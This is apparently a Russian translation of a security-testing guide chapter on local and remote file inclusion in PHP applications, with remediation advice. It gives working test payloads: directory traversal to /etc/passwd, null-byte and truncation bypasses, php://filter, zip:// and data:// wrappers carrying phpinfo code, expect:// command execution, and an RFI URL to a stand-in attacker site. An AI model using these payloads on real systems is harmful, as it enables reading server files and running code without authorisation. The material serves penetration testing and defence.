# Включение файлов (File Inclusion)

## Резюме

Уязвимость внедрения файлов (File Inclusion) позволяет злоумышленнику подключать файлы на сервере, как правило, путем манипуляции механизмами «динамического включения файлов» (dynamic file inclusion), реализованными в целевом приложении. Уязвимость возникает из-за использования пользовательских данных без надлежащей валидации и проверки подлинности путей.

Это может привести как к простому чтению и выводу содержимого локальных файлов, так и к более критическим последствиям:

- Выполнение произвольного кода на веб-сервере
- Выполнение кода на стороне клиента (например, JavaScript), что может привести к другим атакам, таким как межсайтовый скриптинг (Cross-Site Scripting, XSS)
- Отказ в обслуживании (Denial of Service, DoS)
- Раскрытие конфиденциальной информации (Sensitive Information Disclosure)

Внедрение локальных файлов (Local File Inclusion, LFI) — это процесс подключения файлов, уже присутствующих на целевом сервере, посредством эксплуатации уязвимых процедур инклюда в приложении. Например, эта уязвимость возникает, когда веб-страница принимает в качестве параметра путь к локальному файлу. Если этот ввод не проходит должную санитизацию, появляется возможность внедрения символов обхода каталогов (таких как `../` — см. 4.5.1 [Directory Traversal and File Include](../05.%20Authorization%20Testing/01.%20Directory%20Traversal%20File%20Include.md)).

Внедрение удаленных файлов (Remote File Inclusion, RFI) — это процесс подключения файлов с внешних ресурсов через эксплуатацию уязвимых механизмов инклюда в приложении. Например, уязвимость проявляется, когда страница принимает в качестве параметра URL-адрес удаленного ресурса. Если ввод не проверяется должным образом, атакующий может внедрить ссылки на сторонние вредоносные серверы.

В обоих случаях, хотя большинство примеров приводится для скриптов на PHP, следует помнить, что подобные уязвимости актуальны и для других технологий, таких как JSP, ASP и др.

## Цели тестирования

- Идентифицировать точки динамического подключения файлов.
- Оценить уровень критичности и потенциальное воздействие выявленных уязвимостей.

## Методика тестирования

### Локальное включение файлов (LFI)

Поскольку LFI возникает при недостаточной санитизации путей, передаваемых в директивы типа `include`, при тестировании методом «черного ящика» (black-box) необходимо искать функционал, принимающий имена или пути к файлам в качестве параметров.

Рассмотрим следующий пример:

`https://vulnerable_host/preview.php?file=example.html`

Данный параметр выглядит перспективной точкой для проверки на LFI. Если приложение не выбирает жестко предопределенную страницу для параметра `file`, а напрямую передает пользовательский ввод в функцию подключения, появляется возможность загрузить произвольные файлы с сервера.

Классический proof-of-concept эксплойта заключается в попытке прочитать файл `passwd`:

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

Если описанные условия выполняются, в ответе сервера отобразится содержимое системного файла:

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

Даже при наличии такой уязвимости ее эксплуатация в реальных условиях может быть более сложной. Рассмотрим следующий фрагмент кода:

```php
<?php include($_GET['file'].".php"); ?>
```

Простая подстановка имени файла здесь не сработает, так как к переданному значению конкатенируется расширение `.php`. Для обхода подобного ограничения тестировщик может применить ряд специальных техник.

#### Инъекция нулевого байта

Нулевой символ (также известный как `null terminator` или `null byte`) — это управляющий символ со значением 0 во многих кодировках, используемый для обозначения конца строки. При его обработке низкоуровневыми строковыми функциями любые последующие символы отбрасываются. Стандартный способ инъекции этого байта — использование URL-кодированной последовательности `%00`, добавляемой в конец запрашиваемого пути. В приведенном выше примере запрос к `https://vulnerable_host/preview.php?file=../../../../etc/passwd%00` приведет к отсечению суффикса `.php`, в результате чего сервер вернет атакующему список учетных записей пользователей системы.

#### Усечение пути и точек

В большинстве конфигураций PHP действует ограничение на длину пути к файлу в 4096 байт. Если переданное имя файла превышает эту длину, PHP просто усекает его, отбрасывая все лишние символы. Манипулируя длиной передаваемой строки, можно вытеснить расширение `.php` за пределы лимита в 4096 байт. При усечении ошибки не возникает: лишние символы отбрасываются, и PHP продолжает штатное выполнение файла.

Данная техника обхода обычно комбинируется с другими приемами: передачей части пути в кодировке Unicode, двойным URL-кодированием или длинными цепочками последовательностей `./`, сохраняющими корректность пути к целевому файлу.

#### Обертки PHP

Уязвимости внедрения локальных файлов часто воспринимаются лишь как возможность чтения конфиденциальных данных с сервера приложения. Однако в определенных конфигурациях данную уязвимость можно эскалировать [от LFI до удаленного выполнения кода (Remote Code Execution, RCE)](https://corben.io/blog/17-01-01-zip-to-rce-lfi), что чревато полной компрометацией хоста.

Такая эскалация часто реализуется путем объединения [уязвимости LFI со встроенными обертками потоков PHP (PHP wrappers)](https://www.invicti.com/blog/web-security/php-stream-wrappers).

Обертка (wrapper) представляет собой вспомогательный код, расширяющий функциональность базовых операций ввода-вывода. В PHP реализовано множество [встроенных оберток (built-in wrappers)](https://www.php.net/manual/en/wrappers.php) для работы с файловой системой. При обнаружении их поддержки приложением рекомендуется проверить возможность злоупотребления ими для оценки реального риска выявленных недостатков. Ниже приведен список наиболее распространенных оберток; при этом следует учитывать, что приложения могут регистрировать и собственные кастомные обертки, требующие отдельного анализа.

##### PHP Filter

Используется для доступа к локальной файловой системе; это регистронезависимая обертка, позволяющая применять фильтры преобразования к потоку данных в момент открытия файла. Обертка полезна для извлечения содержимого PHP-скриптов без их интерпретации сервером. Например, атакующий может прочитать исходный код PHP-файлов для поиска учетных данных или скрытых уязвимостей.

Пример использования: `php://filter/convert.base64-encode/resource=FILE`, где `FILE` — запрашиваемый файл. В результате содержимое целевого файла считывается, кодируется в base64 (что предотвращает его исполнение на стороне сервера) и возвращается клиенту.

##### PHP ZIP

В PHP 7.2.0 была представлена обертка `zip://` для работы со сжатыми архивами zip. Данная обертка ожидает следующую структуру параметров: `zip:///filename_path#internal_filename`, где `filename_path` — путь к ZIP-архиву, а `internal_filename` — имя файла внутри архива. При эксплуатации символ `#` обычно заменяется на соответствующий URL-код `%23`.

Использование этой обертки позволяет злоумышленнику загрузить на сервер вредоносный ZIP-архив (например, под видом файла аватара через форму загрузки профиля, поскольку обертка `zip://` не требует обязательного расширения `.zip`) и выполнить содержащийся в нем скрипт через LFI.

Для тестирования уязвимости в контексте предыдущего примера кода можно выполнить следующие действия:

1. Создать исполняемый PHP-файл, например с кодом `<?php phpinfo(); ?>`, и сохранить его под именем `code.php`.
2. Запаковать его в ZIP-архив с именем `target.zip`.
3. Переименовать `target.zip` в `target.jpg` для обхода проверки расширений и загрузить на сайт в качестве аватара.
4. Предположив, что файл `target.jpg` сохранен на сервере по пути `../avatar/target.jpg`, проэксплуатировать уязвимость через PHP ZIP wrapper, отправив пейлоад: `zip://../avatar/target.jpg%23code` (где `%23` соответствует символу `#`).

Поскольку в нашем примере расширение `.php` автоматически дописывается ко входному параметру, запрос вида `https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` приведет к интерпретации и исполнению скрипта `code.php`, находящегося внутри ZIP-архива.

##### PHP Data

Поддерживаемая начиная с PHP 5.2.0, эта обертка использует следующий формат: `data://text/plain;base64,BASE64_STR`, где `BASE64_STR` — закодированное в Base64 содержимое файла для обработки. Важно учитывать, что данная обертка функционирует только при включенной директиве конфигурации `allow_url_include`.

Для проверки LFI с помощью этой обертки исполняемый код кодируется в Base64. Например, фрагмент `<?php phpinfo(); ?>` преобразуется в `PD9waHAgcGhwaW5mbygpOyA/Pg==`, а результирующий пейлоад примет вид: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

##### PHP Expect

Данная обертка (отключенная по умолчанию) предоставляет доступ к потокам ввода-вывода процессов `stdio`, `stdout` и `stderr`. При передаче запроса в формате `expect://command` сервер выполняет переданную команду с помощью оболочки `BASH` и возвращает результат выполнения.

### Удаленное включение файлов (Remote File Inclusion, RFI)

Поскольку уязвимость RFI возникает в случаях, когда передаваемые в директивы `include` внешние URL не фильтруются должным образом, при тестировании методом «черного ящика» следует искать скрипты, принимающие имена файлов или адреса через параметры. Рассмотрим следующий пример на PHP:

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

В данном фрагменте путь извлекается напрямую из HTTP-запроса без валидации (например, без сопоставления со списком разрешенных значений — allow list), поэтому данный код уязвим к RFI. Рассмотрим следующий URL:

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

В данном случае удаленный скрипт будет загружен и весь содержащийся в нем код выполнится на веб-сервере.

## Рекомендации по устранению

Наиболее эффективным способом устранения уязвимостей внедрения файлов является полный отказ от передачи пользовательских данных в API файловой системы и платформы. Если архитектурно избежать этого невозможно, приложение должно использовать жесткий список разрешений (allow list) для включаемых страниц и оперировать внутренними числовыми идентификаторами (индексами) для доступа к файлам. Любой запрос с некорректным идентификатором должен отклоняться, исключая возможность манипуляции путем к файлу со стороны пользователя.
Рекомендации по безопасной реализации загрузки файлов см. в [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).
